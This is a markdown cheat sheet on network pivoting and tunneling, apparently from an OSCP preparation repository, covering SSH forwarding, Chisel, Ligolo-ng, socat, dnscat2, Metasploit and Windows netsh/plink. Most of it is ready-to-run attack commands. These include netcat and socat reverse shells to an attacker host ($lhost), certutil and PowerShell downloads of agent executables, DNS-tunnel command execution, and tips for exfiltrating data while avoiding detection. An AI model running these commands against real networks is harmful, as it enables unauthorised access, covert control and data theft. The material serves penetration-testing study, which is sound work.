# Pivoting & Tunneling

## Table of Contents

- [SSH Tunneling](#ssh-tunneling)
  - [Local Port Forwarding](#local-port-forwarding)
  - [Remote Port Forwarding](#remote-port-forwarding)
  - [Dynamic Port Forwarding (SOCKS)](#dynamic-port-forwarding-socks)
- [Proxychains](#proxychains)
- [Ligolo-ng](#ligolo-ng)
- [Chisel](#chisel)
- [Socat](#socat)
- [sshuttle](#sshuttle)
- [dnscat2 (DNS Tunneling)](#dnscat2-dns-tunneling)
- [Metasploit Pivoting](#metasploit-pivoting)
- [Windows Port Forwarding](#windows-port-forwarding)

---

## SSH Tunneling

### Local Port Forwarding

> Forward remote port to local machine

```shell
# Syntax: ssh -L <local_port>:<target_host>:<target_port> <user>@<pivot_host>

# Forward remote MySQL (3306) to local port 3306
ssh -L 3306:localhost:3306 $user@$pivot

# Forward internal host through pivot
ssh -L 3306:10.10.10.5:3306 $user@$pivot

# Access via localhost
mysql -u root -h 127.0.0.1 -p --skip-ssl
```

### Remote Port Forwarding

> Forward local port to remote machine (reverse tunnel)

```shell
# Syntax: ssh -R <remote_port>:<target_host>:<target_port> <user>@<pivot_host>

# Forward local port 4444 to remote port 5555
ssh -R 5555:localhost:4444 $user@$pivot

# Usage: start nc listener locally, connect to pivot:5555 from target
# Local: nc -lvnp 4444
# Target: nc $pivot 5555 -e /bin/bash

# Forward external resource through pivot
ssh -R 5555:208.86.224.90:80 $user@$pivot
```

### Dynamic Port Forwarding (SOCKS)

> Create SOCKS proxy through pivot host

```shell
# Create SOCKS proxy on local port 9050
ssh -D 9050 $user@$pivot

# With SSH key
ssh -i key.pem -D 9050 $user@$pivot

# For older SSH versions
ssh -D 9050 $user@$pivot -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa

# Keep alive
ssh -D 9050 -N -f $user@$pivot
```

### Combined Tunneling

```shell
# Multiple port forwards
ssh -L 3306:localhost:3306 -L 8080:localhost:80 -D 9050 $user@$pivot
```

---

## Proxychains

### Configuration

```shell
# Edit config
sudo nano /etc/proxychains4.conf
```

```ini
# /etc/proxychains4.conf
dynamic_chain
# strict_chain (comment out)

[ProxyList]
socks4 127.0.0.1 9050
# socks5 127.0.0.1 1080
```

### Usage

```shell
# Run commands through proxy
proxychains nmap -sT -Pn -n $target
proxychains mysql -h $target -u root
proxychains evil-winrm -i $target -u Administrator -H <hash>
proxychains ssh $user@$target
proxychains curl http://$target

# Multiple hops (add to config)
socks4 127.0.0.1 9050
socks4 127.0.0.1 9051
```

### Verify Connection

```shell
# Check if tunnel is active
ss -lntp | grep 9050
ps aux | grep "ssh -D"
kill <PID>  # To stop tunnel
```

---

## Ligolo-ng

> **ðŸ“š For complete guide with multi-hop pivoting, port forwarding, and troubleshooting, see [Ligolo-ng Complete Guide](5.3.Ligolo-ng-Complete-Guide.md)**

### Quick Setup

```shell
# Download
git clone https://github.com/nicocha30/ligolo-ng.git

# Create TUN interface (Attacker)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### Attacker (Proxy)

```shell
# Start proxy
sudo ./proxy -selfcert

# After agent connects
ligolo-ng > session
ligolo-ng > [session ID]

# Add route to internal network
sudo ip route add 172.16.0.0/24 dev ligolo

# Start tunnel
ligolo-ng > start
```

### Victim (Agent)

```shell
# Linux
./agent -connect $lhost:11601 -ignore-cert

# Windows
agent.exe -connect $lhost:11601 -ignore-cert
```

### Advanced Commands

```shell
# List interfaces
ligolo-ng > interface_list

# Auto-route
ligolo-ng > autoroute

# Create named interface
ligolo-ng > interface_create --name "internal"
ligolo-ng > interface_add_route --name internal --route 192.168.2.0/24

# Start on specific interface
ligolo-ng > tunnel_start --tun ligolo
```

### File Transfer

```shell
# Download (in PowerShell)
powershell wget -uri "http://$lhost:8000/agent.exe" -OutFile agent.exe

# Or certutil
certutil -urlcache -split -f "http://$lhost:8000/agent.exe" agent.exe
```

---

## Chisel

### Setup

```shell
# Download
# https://github.com/jpillora/chisel/releases

# Server (Attacker)
./chisel server -p 8080 --reverse
```

### Client (Victim)

```shell
# Linux
./chisel client $lhost:8080 R:socks

# Windows
chisel.exe client $lhost:8080 R:socks
```

### SOCKS Proxy

```shell
# Server (Attacker)
./chisel server -p 8080 --reverse

# Client (Victim) - Create SOCKS proxy on attacker:1080
./chisel client $lhost:8080 R:1080:socks

# Use with proxychains
# Add to /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn $target
```

### Port Forwarding

```shell
# Forward specific port
# Server (Attacker)
./chisel server -p 8080 --reverse

# Client (Victim) - Forward victim:3389 to attacker:3389
./chisel client $lhost:8080 R:3389:127.0.0.1:3389

# Connect to localhost:3389 from attacker
rdesktop 127.0.0.1
```

### Multiple Tunnels

```shell
./chisel client $lhost:8080 R:1080:socks R:3389:127.0.0.1:3389 R:445:10.10.10.5:445
```

---

## Socat

### Socat Port Forwarding

```shell
# Forward local port 80 to remote host
socat TCP-LISTEN:80,fork TCP:$target:80

# With bind address
socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:$target:80
```

### UDP Forwarding

```shell
socat UDP-LISTEN:53,fork UDP:$target:53
```

### Relay

```shell
# Create relay (victim)
socat TCP-LISTEN:3333,fork TCP:$lhost:4444

# Connect chain: attacker -> victim:3333 -> lhost:4444
```

### TTY Shell

```shell
# Attacker (listener)
socat file:`tty`,raw,echo=0 TCP-L:4444

# Victim (connect back)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:4444
```

---

## sshuttle

> VPN over SSH - transparent proxy

### Basic Usage

```shell
# Proxy entire subnet
sshuttle -r $user@$pivot 10.10.10.0/24

# With SSH key
sshuttle -r $user@$pivot 10.10.10.0/24 --ssh-cmd "ssh -i key.pem"

# Exclude local network
sshuttle -r $user@$pivot 10.10.10.0/24 -x 10.10.10.1

# DNS through tunnel
sshuttle --dns -r $user@$pivot 10.10.10.0/24
```

### Multiple Subnets

```shell
sshuttle -r $user@$pivot 10.10.10.0/24 172.16.0.0/16 192.168.0.0/16
```

---

## dnscat2 (DNS Tunneling)

> Tunnel traffic through DNS queries - bypasses DPI (Deep Packet Inspection)

### Server Setup (Attacker - Kali)

```shell
# Install
sudo apt install dnscat2

# Start server (authoritative DNS mode - requires domain)
dnscat2-server $domain

# Start server (direct connection mode - no domain required)
dnscat2-server --dns server=127.0.0.1,port=53 --no-cache
dnscat2-server --dns server=127.0.0.1,port=53,type=TXT --no-cache
```

### Client (Victim - Windows)

```powershell
# PowerShell client (dnscat2-powershell)
# https://github.com/lukebaggett/dnscat2-powershell

Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSServer $lhost -Domain $domain
Start-Dnscat2 -DNSServer $lhost -Domain $domain -Exec cmd
```

### Client (Victim - Linux)

```shell
# Compile client
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make

# Connect to server (replace $lhost/$domain with actual values)
./dnscat --dns "server=$lhost,port=53"
./dnscat $domain
```

### Server Commands

```shell
# List sessions
dnscat2> sessions

# Interact with session
dnscat2> session -i 1

# Execute shell
command> shell
command> exec

# Port forwarding
command> listen 127.0.0.1:4444 $target:445

# Download/Upload
command> download C:\users\admin\Desktop\flag.txt
command> upload shell.exe C:\Temp\shell.exe
```

### DNS Tunneling Best Practices

```text
- Use subdomains for data exfiltration
- TXT records can hold more data than A records
- Set longer query intervals to avoid detection
- Use --secret for encrypted tunnel
```

---

## Metasploit Pivoting

### Auto Route

```shell
# In meterpreter session
run autoroute -s 10.10.10.0/24

# Or manually
run post/multi/manage/autoroute
```

### Metasploit SOCKS Proxy

```shell
# Background meterpreter session
background

# Start SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
run

# Use with proxychains
```

### Port Forward

```shell
# In meterpreter
portfwd add -l 3389 -p 3389 -r $target

# Remove
portfwd delete -l 3389 -p 3389 -r $target

# List
portfwd list
```

### Upgrade Shell to Meterpreter

```shell
sessions -u <session_id>
```

---

## Windows Port Forwarding

### netsh

```cmd
# Add port forward
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.5

# List forwards
netsh interface portproxy show all

# Delete forward
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Reset all
netsh interface portproxy reset
```

### plink.exe

```cmd
# Download via PowerShell
powershell wget -uri "http://$lhost/plink.exe" -OutFile plink.exe

# Create reverse tunnel
plink.exe -ssh -l $user -pw $password -R $lport:127.0.0.1:3389 $lhost
```

### PowerShell Port Scanner

```powershell
# Ping sweep
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.10.10.$_", 1) | where status -ne 'TimedOut' | select Address }

# Port scan
1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("$target", $_)) "Port $_ is open" } 2>$null
```

---

## Double Pivoting

### Scenario: Attacker â†’ Pivot1 â†’ Pivot2 â†’ Target

```shell
# Step 1: SSH to Pivot1 with SOCKS
ssh -D 9050 user1@pivot1

# Step 2: Through proxychains, SSH to Pivot2 with another SOCKS
proxychains ssh -D 9051 user2@pivot2

# Add both to proxychains config
# socks5 127.0.0.1 9050
# socks5 127.0.0.1 9051

# Step 3: Access target
proxychains nmap -sT -Pn target
```

---

## Quick Reference

| Tool | Use Case | Command |
| ------ | ---------- | --------- |
| SSH Local | Access remote port locally | `ssh -L 8080:target:80 user@pivot` |
| SSH Remote | Expose local port to remote | `ssh -R 9999:localhost:22 user@pivot` |
| SSH Dynamic | SOCKS proxy | `ssh -D 9050 user@pivot` |
| Ligolo-ng | Full tunnel (layer 3) | `./proxy -selfcert` / `./agent -connect` |
| Chisel | SOCKS + port forward | `chisel server -p 8080 --reverse` |
| sshuttle | VPN over SSH | `sshuttle -r user@pivot 10.0.0.0/8` |
| Proxychains | Route tools through proxy | `proxychains nmap target` |
| Socat | Port relay | `socat TCP-LISTEN:80,fork TCP:target:80` |

---

## See Also

### Detailed Guides

- **[Ligolo-ng Complete Guide](5.3.Ligolo-ng-Complete-Guide.md)** - Full single/multi-hop pivoting walkthrough, troubleshooting
- **[Lateral Movement](5.1.Lateral-Movement.md)** - PsExec, WMI, WinRM, Pass-the-Hash after pivoting

### AD Exploitation (After Pivoting)

- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - BloodHound, ACL abuse on internal network
- **[Kerberos Attacks](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Attack internal Domain Controllers

### OSCP Preparation

- **[Lab Walkthrough Examples](../9.OSCP-Exam/9.2.Lab-Walkthrough-Examples.md)** - AD Set pivoting example
- **[Exam Tips](../9.OSCP-Exam/9.3.Exam-Tips-and-Tricks.md)** - Time management for AD Set
